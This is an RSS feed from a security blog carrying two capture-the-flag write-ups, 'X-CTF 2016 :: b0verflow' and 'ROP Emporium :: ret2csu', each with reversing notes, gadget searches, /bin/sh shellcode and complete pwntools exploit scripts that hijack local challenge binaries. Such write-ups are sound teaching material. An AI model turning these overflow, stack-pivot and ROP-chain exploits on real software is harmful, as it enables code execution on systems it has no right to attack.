<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Fri, 13 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>X-CTF 2016 :: b0verflow</title><link>https://anvbis.github.io/posts/xctf-2016-b0verflow/</link><pubDate>Fri, 13 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/xctf-2016-b0verflow/</guid><description>Reverse Engineering Let&amp;rsquo;s begin by using the file command to get a little insight into this executable. Note that it is a 32-bit linux binary.
$ file ./b0verflow ./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped We can also use checksec to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s begin by using the <code>file</code> command to get a little insight into this executable. Note that it is a 32-bit linux binary.</p>
<pre><code>$ file ./b0verflow 
./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
</code></pre><p>We can also use <code>checksec</code> to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</p>
<pre><code>$ checksec ./b0verflow
[*] './b0verflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p>Running the binary reveals that it at some point prompts us for user input. This is likely where we&rsquo;ll find a vulnerability (perhaps it reads to much data in).</p>
<pre><code>$ ./b0verflow 

======================

Welcome to X-CTF 2016!

======================
What's your name?
anvbis
Hello anvbis
.
</code></pre><p>Disassembling the <code>main</code> function reveals that it calls a function <code>vul</code>. We&rsquo;ll want to investigate this function next, I get the feeling it&rsquo;s vulnerable.</p>
<pre><code>int main (int argc, char **argv, char **envp);
0x0804850e      push    ebp
0x0804850f      mov     ebp, esp
0x08048511      and     esp, 0xfffffff0
0x08048514      call    vul        ; sym.vul
0x08048519      leave
0x0804851a      ret
</code></pre><p>Reversing the <code>vul</code> function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer <code>*s</code>. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined4 <span style="color:#a6e22e">vul</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s;
    
    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">======================&#34;</span>);
    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Welcome to X-CTF 2016!&#34;</span>);
    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">======================&#34;</span>);
    puts(<span style="color:#e6db74">&#34;What</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s your name?&#34;</span>);
    fflush(_reloc.stdout);
    fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x32</span>, _reloc.stdin);
    printf(<span style="color:#e6db74">&#34;Hello %s.&#34;</span>, <span style="color:#f92672">&amp;</span>s);
    fflush(_reloc.stdout);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>We&rsquo;ve found our stack buffer overflow.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>Next, let&rsquo;s find where the return address is relative to our input buffer. Note that the <code>vul</code> function doesn&rsquo;t read many bytes in (only 0x32) so hopefully this is enough to reach the return address.</p>
<p>Here&rsquo;s a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./b0verflow&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">100</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.</p>
<pre><code>pwndbg&gt; x/4x $esp
0xff93cf20:     0x6161616b      0x6161616c      0x0000006d      0xf7de4e46
</code></pre><p>Let&rsquo;s print out the value of <code>$eip</code> and use pwntools' <code>cyclic_find</code> function to find the offset. It appears that <code>$eip</code> is 36 bytes after the start of our input buffer.</p>
<pre><code>pwndbg&gt; p $eip
$1 = (void (*)()) 0x6161616a
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616a</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">36</span>
</code></pre></div><p>So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let&rsquo;s use the <code>ropper</code> tool to see if we can find any gadgets to pivot our stack.</p>
<pre><code>$ ropper --file ./b0verflow --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804837e: add esp, 8; pop ebx; ret; 
0x0804847e: ret 0xeac1; 
0x08048500: sub esp, 0x24; ret; 

4 gadgets found
</code></pre><p>The gadget that I immediately noticed was <code>sub esp, 0x24; ret</code>, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).</p>
<pre><code>0x08048500: sub esp, 0x24; ret;
</code></pre><p>Now we just need something like a <code>jmp esp</code> or a <code>mov eax, esp; jmp eax</code> gadget to direct process execution to our shellcode. Using <code>ropper</code> again, we immediately find a <code>jmp esp</code> instruction.</p>
<pre><code>$ ropper --file ./b0verflow --search 'jmp esp'                                                              130 тип
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp

[INFO] File: ./b0verflow
0x08048504: jmp esp;
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we have all the information we need, we can start developing our exploit.</p>
<p>Let&rsquo;s write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I&rsquo;ve used various techniques (such as using <code>xor</code> to set registers to <code>0</code>) to reduce the size of the shellcode.</p>
<pre><code>.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # &quot;/sh&quot;
    push 0x6e69622f     # &quot;/bin&quot;
    mov ebx, esp        # &quot;/bin/sh&quot;
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    int 0x80            # execve(&quot;/bin/sh&quot;)
</code></pre><pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
</code></pre><p>After compilation, we can see that our shellcode is only 20 bytes long, very nice.</p>
<pre><code>08049000 &lt;_start&gt;:
 8049000:       68 2f 73 68 00          push   $0x68732f
 8049005:       68 2f 62 69 6e          push   $0x6e69622f
 804900a:       89 e3                   mov    %esp,%ebx
 804900c:       31 c9                   xor    %ecx,%ecx
 804900e:       31 d2                   xor    %edx,%edx
 8049010:       b0 0b                   mov    $0xb,%al
 8049012:       cd 80                   int    $0x80
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">1</span>]: open(<span style="color:#e6db74">&#39;payload&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
Out[<span style="color:#ae81ff">1</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#39;</span>

In [<span style="color:#ae81ff">2</span>]: len(open(<span style="color:#e6db74">&#39;payload&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read())
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">20</span>
</code></pre></div><p>Now we can write our final exploit. Note that we need to add the address to the <code>jmp esp</code> gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot).</p>
<p>Here&rsquo;s an overview of what we want to achieve:</p>
<ul>
<li>Pivot our stack with the <code>sub esp, 0x24; ret</code> gadget.</li>
<li>Jump to <code>$esp</code>, where our shellcode is stored.</li>
<li>Get shellcode execution.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x08048504: jmp esp;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
jmp_esp <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048504</span>)

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x08048500: sub esp, 0x24; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
sub_esp <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048500</span>)


buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#39;</span>

lpad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
rpad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">36</span> <span style="color:#f92672">-</span> len(buf) <span style="color:#f92672">-</span> len(jmp_esp) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>)

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./b0verflow&#39;</span>)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(lpad <span style="color:#f92672">+</span> jmp_esp <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> rpad <span style="color:#f92672">+</span> sub_esp)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>$ ./exploit.py 
[+] Starting local process './b0verflow': pid 2328
[*] Switching to interactive mode
$ cat flag.txt
X-CTF{b0verflow}
$ 
[*] Stopped process './b0verflow' (pid 2328)
</code></pre>]]></content></item><item><title>ROP Emporium :: ret2csu</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s run the <code>file</code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.</p>
<pre><code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
</code></pre><p>We can also run <code>checksec</code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&rsquo;t execute shellcode.</p>
<pre><code>$ checksec ./ret2csu
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
</code></pre><p>Running the executable shows us that it at some point takes user input. This is likely where we&rsquo;ll be able to find some vulnerability.</p>
<pre><code>$ ./ret2csu                   
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

&gt; hello
Thank you!
</code></pre><p>After a tiny bit of reverse engineering, we see this <code>pwnme</code> function called by <code>main</code>. We can see that it allocates 0x20 bytes of memory for a buffer <code>buf</code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwnme</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf;
    
    setvbuf(<span style="color:#f92672">*</span>_reloc.stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
    puts(<span style="color:#ae81ff">0xc88</span>);
    puts(<span style="color:#ae81ff">0xca0</span>);
    memset(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>);
    puts(<span style="color:#ae81ff">0xca8</span>);
    printf(<span style="color:#ae81ff">0xd12</span>);
    read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x200</span>);
    puts(<span style="color:#ae81ff">0xd15</span>);
    <span style="color:#66d9ef">return</span>;
}
</code></pre></div><p>Further investigation reveals that there is a function called <code>ret2win</code>. Another function <code>usefulFunction</code> appears to call <code>ret2win</code> with the parameters <code>ret2win(0x3, 0x2, 0x1)</code>. We&rsquo;ll want to investigate this function further.</p>
<pre><code>0x00400510    1 6            sym.imp.ret2win
</code></pre><pre><code>0x000000000040061b &lt;+4&gt;:     mov    edx,0x3
0x0000000000400620 &lt;+9&gt;:     mov    esi,0x2
0x0000000000400625 &lt;+14&gt;:    mov    edi,0x1
0x000000000040062a &lt;+19&gt;:    call   0x400510 &lt;ret2win@plt&gt;
</code></pre><p>Reversing the <code>ret2win</code> function reveals that it will immediately call <code>exit</code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in <code>encrypted_flag.dat</code>.</p>
<p>The correct parameters are as follows:</p>
<ul>
<li><code>$rdi = 0xdeadbeefdeadbeef</code>.</li>
<li><code>$rsi = 0xcafebabecafebabe</code>.</li>
<li><code>$rdx = 0xd00df00dd00df00d</code>.</li>
</ul>
<p>So we have to find some way to set all of these registers to their correct values before calling the <code>ret2win</code> function in order to get the flag.</p>
<pre><code>      0x000009ef      48b8efbeadde.  movabs rax, 0xdeadbeefdeadbeef
      0x000009f9      483945e8       cmp qword [var_18h], rax
  тФМтФА&lt; 0x000009fd      0f85d7000000   jne 0xada
  тФВ   0x00000a03      48b8bebafeca.  movabs rax, 0xcafebabecafebabe
  тФВ   0x00000a0d      483945e0       cmp qword [var_20h], rax
 тФМтФАтФА&lt; 0x00000a11      0f85c3000000   jne 0xada
 тФВтФВ   0x00000a17      48b80df00dd0.  movabs rax, 0xd00df00dd00df00d
 тФВтФВ   0x00000a21      483945d8       cmp qword [var_28h], rax
тФМтФАтФАтФА&lt; 0x00000a25      0f85af000000   jne 0xada
тФВтФВтФВ   0x00000a2b      488d35ee0200.  lea rsi, [0x00000d20]
тФВтФВтФВ   0x00000a32      488d3de90200.  lea rdi, str.encrypted_flag.dat
тФВтФВтФВ   0x00000a39      e8f2fdffff     call sym.imp.fopen

...

тФВтФВтФВ
тФФтФФтФФтФА&gt; 0x00000ada      488d3d930200.  lea rdi, str.Incorrect_parameters
      0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
      0x00000ae6      bf01000000     mov edi, 1                  ; int status
      0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s find the offset of the return address from where our input buffer is stored in the <code>pwnme</code> function.</p>
<p>We&rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">200</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.</p>
<pre><code>pwndbg&gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
</code></pre><p>Using pwntools' <code>cyclic_find</code> function we can get the offset from the start of our input buffer to the return address stored on the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616166</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">40</span>
</code></pre></div><p>Next let&rsquo;s figure out how we can store a value in the <code>$rdx</code> register. We&rsquo;re able to store values in the <code>$rdi</code> and <code>$rsi</code> registers quite easily (they have <code>pop; ret</code> gadgets we can easily use).</p>
<p>After digging around the <code>__libc_csu_init</code> function, we find two interesting looking gadgets, see below (I&rsquo;ve added some comments for clarity).</p>
<p>Note that we can use the first gadget to set the values of <code>$rsi</code> and <code>$rdx</code>.</p>
<pre><code>0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
0x00400691      4839dd         cmp rbp, rbx
0x00400694      75ea           jne 0x400680
</code></pre><pre><code>0x0040069a      5b             pop rbx ; set to 0
0x0040069b      5d             pop rbp ; set to 1 to bypass check after call
0x0040069c      415c           pop r12 ; set to pointer to useless function
0x0040069e      415d           pop r13
0x004006a0      415e           pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2      415f           pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4      c3             ret
</code></pre><p>It&rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.</p>
<p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).</p>
<p>Note the <code>call qword [r12 + rbx*8]</code> instruction. As it dereferences a pointer to a function, we can&rsquo;t use this to redirect execution.</p>
<pre><code>0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
</code></pre><p>Instead we&rsquo;ll have to find a pointer to some function that doesn&rsquo;t change anything, as to not ruin the values stored in our target registers. We&rsquo;ll just pass by this call and head to the <code>ret</code> instruction below.</p>
<p>Let&rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.</p>
<pre><code>pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  ret2win@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
</code></pre><p>Using <code>objdump</code> and <code>grep</code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.</p>
<p>The address that immediately jumps out to me is <code>0x4003af</code>, which contains the bytes for the <code>_fini</code> function, a suitably inert function.</p>
<pre><code>$ objdump -D ret2csu | grep '06 40' -B 1
  4003ad:       00 0e                   add    %cl,(%rsi)
  4003af:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
--
  40052e:       54                      push   %rsp
  40052f:       49 c7 c0 b0 06 40 00    mov    $0x4006b0,%r8
  400536:       48 c7 c1 40 06 40 00    mov    $0x400640,%rcx
  40053d:       48 c7 c7 07 06 40 00    mov    $0x400607,%rdi
--
  600e45:       00 00                   add    %al,(%rax)
  600e47:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
</code></pre><p>We can look this up in GDB to be sure (adding 1 to align the address correctly).</p>
<pre><code>pwndbg&gt; x/x (0x4003af + 1)
0x4003b0:       0x00000000004006b4
</code></pre><p>Now we can use the <code>ropper</code> tool to find a gadget to set the value of <code>$rdi</code>. Surprise, surprise, we immediately find one.</p>
<pre><code>$ ropper --file ./ret2csu --search '% rdi' 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>We have all the information we need, so let&rsquo;s start building our exploit. Here&rsquo;s an outline of what we want to achieve:</p>
<ul>
<li>Overwrite the return address in the <code>pwnme</code> function.</li>
<li>Store the values <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> in the <code>$rsi</code> and <code>$rdx</code> registers.</li>
<li>Store the value <code>0xdeadbeefdeadbeef</code> in the <code>$rdi</code> register.</li>
<li>Call the <code>ret2win</code> function with the above values.</li>
</ul>
<p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values <code>$rbp = 1</code> and <code>$rbx = 0</code>.</p>
<p>We also have to pad out the stack so that the <code>pop</code> instructions after the call don&rsquo;t destroy our rop chain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">pop rbx     ; 0
</span><span style="color:#e6db74">pop rbp     ; 1
</span><span style="color:#e6db74">pop r12     ; 0x4003af+1
</span><span style="color:#e6db74">pop r13
</span><span style="color:#e6db74">pop r14     ; 0xcafebabecafebabe
</span><span style="color:#e6db74">pop r15     ; 0xd00df00dd00df00d
</span><span style="color:#e6db74">ret         ; ret2csu_rdx
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
ret2csu_set <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00400680</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">mov rdx, r15
</span><span style="color:#e6db74">mov rsi, r14
</span><span style="color:#e6db74">mov edi, r13d
</span><span style="color:#e6db74">call qword [r12 + rbx*8]
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
ret2csu_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040069a</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">pop rdi     ; 0xdeadbeefdeadbeef
</span><span style="color:#e6db74">ret         ; ret2win
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004006a3</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">jmp qword [reloc.ret2win]
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
ret2win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00400510</span> 


elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)
rop <span style="color:#f92672">=</span> ROP(elf)

<span style="color:#75715e"># ret2csu_set</span>
rop<span style="color:#f92672">.</span>raw(ret2csu_rdx)
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop rbx</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">1</span>)                  <span style="color:#75715e"># pop rbp</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0x4003af</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)         <span style="color:#75715e"># pop r12</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r13</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xcafebabecafebabe</span>) <span style="color:#75715e"># pop r14</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xd00df00dd00df00d</span>) <span style="color:#75715e"># pop r15</span>

<span style="color:#75715e"># ret2csu_rdx</span>
rop<span style="color:#f92672">.</span>raw(ret2csu_set)

<span style="color:#75715e"># pop_rdi</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># stack alignment</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop rbx</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop rbp</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r12</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r13</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r14</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r15</span>
rop<span style="color:#f92672">.</span>raw(pop_rdi)
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>) <span style="color:#75715e"># pop rdi</span>

<span style="color:#75715e"># ret2win</span>
rop<span style="color:#f92672">.</span>raw(ret2win)

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())

r<span style="color:#f92672">.</span>readline()
log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> r<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>./exploit.py 
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
